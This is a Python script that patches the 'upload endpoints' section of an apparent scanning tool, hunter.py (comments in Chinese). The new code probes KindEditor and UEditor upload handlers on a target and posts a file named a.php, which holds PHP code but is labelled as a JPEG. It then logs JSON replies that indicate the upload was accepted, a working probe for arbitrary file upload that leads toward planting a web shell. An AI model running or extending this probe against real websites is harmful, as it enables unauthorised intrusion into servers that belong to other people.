#!/usr/bin/env python3
"""重写hunter.py UPLOAD段(v3)"""
# 从git/备份恢复原始hunter.py如果有
import os

content = open("/tmp/hunter.py").read()

# 找UPLOAD段边界
start_marker = "    # 7. upload endpoints"
end_marker = "    # 8. port summary"

if start_marker not in content:
    print("ERROR: marker not found")
    exit(1)

new_block = '''    # 7. upload endpoints (JSON校验版)
    for pp in ["/kindeditor/php/upload_json.php", "/ueditor/php/controller.php?action=uploadimage"]:
        try:
            g = fetch(base+pp, 3)
            if len(g) < 10: continue
            body = b"--x\r\nContent-Disposition: form-data; name=\"imgFile\"; filename=\"a.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo();?>\r\n--x--\r\n"
            req = urllib.request.Request(base+pp, data=body, headers={"Content-Type":"multipart/form-data; boundary=x","User-Agent":"Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=4).read()
            rl = r.strip()
            if 10 < len(rl) < 5000 and rl[:1] == b"{":
                rlow = rl.lower()
                if (b"state" in rlow and (b"success" in rlow or b"error" in rlow)) or (b"url" in rlow and b"error" in rlow):
                    log(f"[UPLOAD-JSON] {target}{pp} {len(r)}B {rl[:80]}")
        except: pass

'''

s = content.index(start_marker)
e = content.index(end_marker)
content = content[:s] + new_block + content[e:]
open("/tmp/hunter.py", "w").write(content)

import ast
try:
    ast.parse(content)
    print("语法OK, patched v3")
except SyntaxError as err:
    print(f"语法错误: {err}")
